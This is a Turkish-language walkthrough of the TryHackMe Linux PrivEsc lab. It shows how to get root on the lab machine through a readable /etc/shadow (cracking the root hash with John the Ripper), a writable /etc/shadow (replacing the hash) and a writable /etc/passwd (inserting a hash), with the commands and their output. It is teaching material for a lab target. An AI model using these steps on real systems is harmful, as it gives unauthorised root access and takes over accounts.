# Linux Privilege Escalation (Linux Yetki Yükseltme)

<figure><img src=".gitbook/assets/_37abf240-b5ba-43ed-a656-76b994160740.jpeg" alt="" width="375"><figcaption></figcaption></figure>

Hedef bir sisteme çeşitli şekillerde sızdıktan sonra sistem üzerinde tam bir yetkiye sahip olamayabiliriz. Çeşitli yöntemlerle sahip olduğumuz yetkileri yükseltebiliriz. Yöntemlerimizi test etmek için Try Hack Me üzerinden bulunan [Linux PrivEsc](https://tryhackme.com/r/room/linuxprivesc) labından göstereceğim.

Öncelikle labda bulunan makineyi çalıştırıyoruz ve çalıştıktan sonra bize verilen SSH bilgileriyle hedef sisteme bağlanmalıyız. Hedef sisteme `10.10.94.109` Ip adresiyle ulaşacağız. SSH bağlantısı için user ve password321  ikilisi kullanıcak.

`ssh user@10.10.94.109`

### Okunabilir /etc/shadow

Linux sistemlerinde kullanıcı bilgileri /etc/passwd dosyasında, kullanıcı hashleri /etc/shadow dosyasında depolanır. Normal bir sistemde sistem yada kullanıcılar hakkında kritik bilgileri normal bir kullanıcının okuyamaması lazım.

Linux sistemimizde `/etc/shadow` dosyasının sahip olduğu izinleri görmek için şu komutu çalıştırıyoruz ve şu çıktıyı alıyoruz:

```
user@debian:~$ ls -al /etc/shadow

-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```

/etc/shadow dosyası üzerinde okuma ve yazma yetkimiz olduğunu görüyoruz. Güvenli bir sistemde bu izinlere sahip olmamız gerekiyor.

/etc/shadow dosyasında bulunan hash değerini okuyup John The Ripper yada Hashcat gibi araçlarla hash değerini kırmayı deneyebiliriz.

```
user@debian:~$ cat /etc/shadow

root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
...........................
```

Dosyayı okuduğumuzda root kullanıcısının şifre hash değerine ulaşıyoruz. `$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0` hash değerini kendi makinemizde hash.txt dosyasının içine ekliyoruz.&#x20;

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Bu işlem sonucunda hashlenmiş şifre değerine ulaşıyoruz: `password123`

Elde ettiğimiz şifre ile artık root olabiliriz.&#x20;

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p>Şifre kısmında elde ettiğimiz şifreyi giriyoruz "password123"</p></figcaption></figure>

Root yetkilerine sahip olduktan sonra diğer yöntemlerle yetki yükseltmek için root yetkisinden `exit` komutuyla çıkıyoruz.

### Yazılabilir /etc/shadow

/etc/shadow dosyası üzerinde okuma ve yazma yetkilerimiz olduğunu görmüştük. Her zaman elde ettiğimiz hash değerini kıramayabiliriz. Bu yüzden var olan hash değerini kendi oluşturacağımız hash değeriyle değiştirebiliriz.

Öncelikle `mkpasswd -m sha-512 <newPassword>` komutuyla yeni bir hash değeri elde edebiliriz.

Metin editörleriyle birlikte /etc/shadow dosyası açılıp root kullanıcısının sahip olduğu hash değeri değiştirilip kaydedilir. Sonrasında su root yaparak kendi oluşturduğumuz şifreyle root yetkilerine sahip olacağız.

```
root@ip-10-10-63-77:~/Desktop# mkpasswd -m sha-512 yavuz
$6$2OGh.AKPtUIfLWD$62aars53c2GpdNPeeLwB5pfqdstcsKUhZLPhobwiyXXehe2uL8NllzXtMgu2icxgFAJoD/H8YiPc1z9epn1430

// Eski /etc/shadow dosyası
user@debian:~$ more /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
................................

// Hash değerini güncelledikten sonra /etc/shadow dosyası
user@debian:~$ cat /etc/shadow
root:$6$2OGh.AKPtUIfLWD$62aars53c2GpdNPeeLwB5pfqdstcsKUhZLPhobwiyXXehe2uL8NllzXtMgu2icxgFAJoD/H8YiPc1z9epn1430:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
................................
```

### /etc/passwd

/etc/passwd dosyası kullanıcılar hakkında bilgileri barındırır. Yetkisiz bir kullanıcı bu içeriği okuyabilir ama üzerinde yazma yetkisine sahip olmaması lazım. Bizim hedef sistemimizde /etc/passwd dosyası üzerinde ne yetkilerimiz var bakalım.

```
user@debian:~$ ls -al /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
```

Dosya üzerinde yazma yetkisine sahibiz. Eski Linux sürümlerinde şifre hashleri /etc/passwd dosyalarında depolanırdı. Bazı sürümlerde hala bu durum geçerlidir.

cat komutuyla /etc/passwd dosyamızı okuyalım ve dosya yapısını görelim.

```
user@debian:~$ cat /etc/passwd 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
........................
```

root kelimesinden sonra gelen x karakteri /etc/passwd dosyasında şifre içermediğini, /etc/shadow dosyasında bu kullanıcı ile ilgili şifre olabilir anlamına geliyor. x değerini silip buraya hashlenmiş şifre değerini eklersek bizim sahip olacağız yeni root şifresi bu olacaktır.&#x20;

`mkpasswd -m sha-512 yavuzkuk55` komutuyla yeni hash değeri oluşturuluyor. /etc/passwd dosyasında bulunan x değeri kaldırılıp elde ettiğimiz hash değeri eklenmiştir.&#x20;

```
user@debian:~$ cat /etc/passwd

root:$6$PO6v6WfO$k4pUdK.o9nLWcqpalwU.oX3slTdCzfd6mwQ8LRraAUYflxWYUvNVQiQz9NWRKnKJ6bsebKIiskl6ijux2R6EC.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
```

`su root` komutu yazdıktan sonra oluşturduğumuz şifre ile sisteme root yetkileriyle giriş yapabiliriz.

***

